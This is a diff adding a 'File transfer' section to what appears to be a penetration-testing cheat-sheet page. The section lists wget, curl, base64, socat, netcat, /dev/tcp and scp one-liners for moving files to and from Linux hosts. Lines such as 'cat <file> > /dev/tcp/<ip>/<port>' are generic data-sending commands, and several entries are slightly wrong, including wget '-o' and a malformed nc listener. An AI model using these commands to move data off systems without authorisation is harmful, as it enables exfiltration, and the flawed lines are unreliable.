@@ -182,7 +182,123 @@ layout: default
     <ul>
         <li>pspy</li>
     </ul>
-    
+
+    <h2>File transfer</h2>
+
+    <li>Download to Linux</li>
+    <table>
+        <tr>
+            <td>wget</td>
+            <td>wget &lt;url&gt; -o &lt;Output File&gt;</td>
+        </tr>
+        <tr>
+            <td>curl</td>
+            <td>curl &lt;url&gt; -O &lt;Output File&gt;</td>
+        </tr>
+        <tr>
+            <td>Base64</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Base64 Encrypt File</td>
+                        <td>base64 &lt;file&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Decode Base64 and Recreate File</td>
+                        <td>base64 -d &lt;file w/ base64 text&gt; &gt; file</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>socat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload</td>
+                        <td>socat TCP4-LISTEN:&lt;port #&gt;,fork file:&lt;File&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download</td>
+                        <td>socat TCP4:&lt;ip address&gt;:&lt;port #&gt; file:&lt;File&gt;,create</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>netcat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload</td>
+                        <td>nc &lt;ip address&gt; &lt;port #&gt;  &lt; &lt;Upload File&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download</td>
+                        <td>nc -lvnp &lt;ip address&gt; &lt;port #&gt; &gt; &lt;Download File&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>scp</td>
+            <td>scp &lt;user&gt;@&lt;ip address&gt;:&lt;file&gt; &lt;Directory to Download to&gt;</td>
+        </tr>
+    </table>
+
+    <li>Upload to Linux</li>
+    <table>
+        <tr>
+            <td>Base64</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Base64 Encrypt File</td>
+                        <td>base64 &lt;file&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Decode Base64 and Recreate File</td>
+                        <td>base64 -d &lt;file w/ base64 text&gt; &gt; file</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>socat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload</td>
+                        <td>socat TCP4-LISTEN:&lt;port #&gt;,fork file:&lt;File&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download</td>
+                        <td>socat TCP4:&lt;ip address&gt;:&lt;port #&gt; file:&lt;File&gt;,create</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>/dev/tcp</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload file</td>
+                        <td>cat &lt;file&gt; &gt; /dev/tcp/&lt;ip address&gt;/&lt;port&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download File</td>
+                        <td>nc -lvnp &lt;port&gt; &gt; &lt;Output File&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>scp</td>
+            <td>scp &lt;file to upload&gt; &lt;user&gt;@&lt;ip address&gt;:&lt;Directory to upload to&gt;</td>
+        </tr>
+    </table>
+
     <h2>Shell Upgrade and Escapes</h2>
     
     <li>Upgrade</li>
